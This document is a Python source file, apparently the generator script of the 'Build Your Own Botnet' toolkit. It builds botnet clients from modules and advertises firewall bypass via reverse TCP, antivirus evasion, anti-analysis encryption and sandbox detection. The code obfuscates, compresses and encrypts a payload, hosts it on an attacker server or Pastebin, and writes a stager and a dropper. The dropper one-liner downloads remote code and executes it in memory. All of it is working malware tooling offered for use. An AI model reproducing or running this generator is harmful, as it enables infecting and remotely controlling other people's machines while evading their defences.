#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Generator (Build Your Own Botnet)

Generate clients with the following features:

    - Zero Dependencies
        stager runs with just the python standard library

    - Remote Imports
        remotely import third-party packages from
        the server without downloading/installing them

    - In-Memory Execution Guidline
        clients never write anything to the disk, 
        not even temporary files - zero IO system calls.
        remote imports allow code/scripts/modules to
        be dynamically loaded into memory and directly 
        imported into the currently running process

    - Add Your Own Scripts
        every python script, module, and package in the
        `remote` directory is directl usable by every 
        client at all times while the server is running

    - Unlimited Modules Without Bloating File Size
        use remote imports to add unlimited features without
        adding a single byte to the client's file size 

    - Updatable
        client periodically checks the content available
        for remote import from the server, and will 
        dynamically update its in-memory resources
        if anything has been added/removed

    - Platform Independent
        compatible with PyInstaller and package is authored 
        in Python, a platform agnostic language

    - Bypass Firewall
        connects to server via outgoing connections
        (i.e. reverse TCP payloads) which most firewall
        filters allow by default k

    - Evade Antivirus
        blocks any spawning process
        with names of known antivirus products

    - Prevent Analysis
        main client payload encrypted with a random 
        256-bit key and is only 

    - Avoid Detection
        client will abort execution if a virtual machine
        or sandbox is detected
"""

# standard library
import os
import sys
import imp
import json
import zlib
import struct
import base64
import random
import urllib
import urllib2
import marshal
import logging
import requests
import argparse
import threading
import subprocess

# external libraries
import colorama

# modules
import core.util as util
import core.security as security
import core.generators as generators

# globals
colorama.init(autoreset=True)
__banner = """ 

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'
"""

# main
def main():
    """ 
    Parse command-line arguments and run the generator

    usage: generators.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                         [--encrypt] [--obfuscate] [--compress] [--compile]
                         host port [modules [modules ...]]

    positional arguments:
      host            server IP address
      port            server port number
      modules         modules to remotely import at run-time

    optional arguments:
      -h, --help      show this help message and exit
      -v, --version   show program's version number and exit
      --name NAME     output file name
      --icon ICON     icon image file name
      --pastebin API  upload & host payload on pastebin
      --encrypt       encrypt payload and embed key in stager
      --obfuscate     obfuscate names of classes, functions & variables
      --compress      zip-compress into a self-executing python script
      --exe           compile into a standalone executable (Windows, Linux)
      --app           bundle into standalone application (Mac OS X)

    """

    util.display(globals()['__banner'], color=random.choice(filter(str.isupper, dir(colorama.Fore))), style='bright')

    parser = argparse.ArgumentParser(prog='generator.py', 
                                    version='0.1.5',
                                    description="Generator (Build Your Own Botnet)")
    parser.add_argument('host',
                        action='store',
                        type=str,
                        help='server IP address')
    parser.add_argument('port',
                        action='store',
                        type=str,
                        help='server port number')
    parser.add_argument('modules',
                        action='append',
                        nargs='*',
                        help='modules to remotely import at run-time')
    parser.add_argument('--name',
                        action='store',
                        help='output file name')
    parser.add_argument('--icon',
                        action='store',
                        help='icon image file name')
    parser.add_argument('--pastebin',
                        action='store',
                        metavar='API',
                        help='upload & host payload on pastebin')
    parser.add_argument('--encrypt',
                        action='store_true',
                        help='encrypt payload and embed key in stager',
                        default=False)
    parser.add_argument('--obfuscate',
                        action='store_true',
                        help='obfuscate names of classes, functions & variables',
                        default=False)
    parser.add_argument('--compress',
                        action='store_true',
                        help='zip-compress into a self-executing python script',
                        default=False)
    parser.add_argument('--exe',
                        action='store_true',
                        help='compile into a standalone bundled executable',
                        default=False)
    parser.add_argument('--app',
                        action='store_true',
                        help='bundle into a standlone application',
                        default=False)

    options = parser.parse_args()
    key = base64.b64encode(os.urandom(16))
    var = generators.variable(3)
    modules = _modules(options, var=var, key=key)
    imports = _imports(options, var=var, key=key, modules=modules)
    hidden  = _hidden (options, var=var, key=key, modules=modules, imports=imports)
    payload = _payload(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden)
    stager  = _stager (options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=payload)
    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)
    return dropper

def _update(input, output, task=None):
    diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')

def _modules(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=',')
    util.display('Modules', color='reset', style='bright')
    util.display("        Adding modules...", color='reset', style='normal', end=',')
    __load__ = threading.Event()
    __spin__ = util.spinner(__load__)
    modules = ['core/loader.py','core/util.py','core/security.py','core/payload.py']

    if len(options.modules):
        for m in options.modules:
            if isinstance(m, str):
                base = os.path.splitext(os.path.basename(m))[0]
                if not os.path.exists(m):
                    _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                    if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
                        util.display("[-]", color='red', style='normal')
                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
                        continue
                module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                modules.append(module)

    __load__.set()
    util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
    return modules

def _imports(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=',')
    util.display("Imports", color='reset', style='bright')
    assert 'modules' in kwargs, "missing keyword argument 'modules'"
    util.display("        Adding imports...", color='reset', style='normal', end=',')
    globals()['__load__'] = threading.Event()
    globals()['__spin__'] = util.spinner(__load__)
    imports  = set()

    for module in kwargs['modules']:
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                        if x in line:
                            break
                    else:
                        imports.add(line.strip())
                elif len(line.split()) > 3:
                    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
                        for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                            if x in line.strip():
                                break
                        else:
                            imports.add(line.strip())
    imports = list(imports)
    return imports
                 
def _hidden(options, **kwargs):
    assert 'imports' in kwargs, "missing keyword argument 'imports'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"
    hidden = set()

    for line in kwargs['imports']:
        if len(line.split()) > 1:
            for i in str().join(line.split()[1:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)
        elif len(line.split()) > 3:
            for i in str().join(line.split()[3:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)

    globals()['__load__'].set()
    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
    return list(hidden)

def _payload(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=',')
    util.display("Payload", color='reset', style='bright')
    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"
    assert 'imports' in kwargs, "missing keyword argument 'imports'"
    payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
    if not os.path.exists('payloads'):
        try:
            os.mkdir('payloads')
        except OSError:
            __logger__.debug("Permission denied: unabled to make directory './modules/payloads/'")

    if options.obfuscate:
        __load__= threading.Event()
        util.display("        Obfuscating payload...", color='reset', style='normal', end=',')
        __spin__= util.spinner(__load__)
        output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
        __load__.set()
        _update(payload, output, task='Obfuscation')
        payload = output

    if options.compress:
        util.display("        Compressing payload... ", color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        output = generators.compress(payload)
        __load__.set()
        _update(payload, output, task='Compression')
        payload = output

    if options.encrypt:
        assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
        util.display("        Encrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        output = generators.encrypt(payload, kwargs['key'])
        __load__.set()
        _update(payload, output, task='Encryption')
        payload = output

    util.display("        Uploading payload... ", color='reset', style='normal', end=',')
    __load__ = threading.Event()
    __spin__ = util.spinner(__load__)

    if options.pastebin:
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(payload, api_dev_key=options.pastebin)
    else:
        dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d
        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
        with file(path, 'w') as fp:
            fp.write(payload)
        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urllib2.urlparse.urlsplit(s)
        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
    __load__.set()
    util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
    return url

def _stager(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=',')
    util.display("Stager", color='reset', style='bright')
    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'key' in kwargs, "missing keyword argument 'key'"
    assert 'var' in kwargs, "missing keyword argument 'var'"
    stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=kwargs['url'], key=kwargs['key'])
    if not os.path.exists('stagers'):
        try:
            os.mkdir('stagers')
        except OSError:
            __logger__.debug("Permission denied: unable to make directory './modules/stagers/'")

    if options.obfuscate:
        util.display("        Obfuscating stager... ", color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        output = generators.obfuscate(stager)
        __load__.set()
        _update(stager, output, task='Obfuscation')
        stager = output

    if options.compress:
        util.display("        Compressing stager... ", color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
        __load__.set()
        _update(stager, output, task='Compression')
        stager = output
    util.display("        Uploading stager... ", color='reset', style='normal', end=',')
    __load__ = threading.Event()
    __spin__ = util.spinner(__load__)

    if options.pastebin:
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(stager, api_dev_key=options.pastebin)
    else:
        dirs = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d
        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
        with file(path, 'w') as fp:
            fp.write(stager)
        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urllib2.urlparse.urlsplit(s)
        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
    __load__.set()
    util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
    return url

def _dropper(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=',')
    util.display("Dropper", color='reset', style='bright')
    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
    name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
    if not name.endswith('.py'):
        name += '.py'
    dropper = "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
    with file(name, 'w') as fp:
        fp.write(dropper)

    if options.exe:
        util.display('    Compiling executable...', color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
        __load__.set()

    elif options.app:
        util.display('    Bundling application...', color='reset', style='normal', end=',')
        __load__ = threading.Event()
        __spin__ = util.spinner(__load__)
        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
        __load__.set()

    util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
    return name

if __name__ == '__main__':
    main()
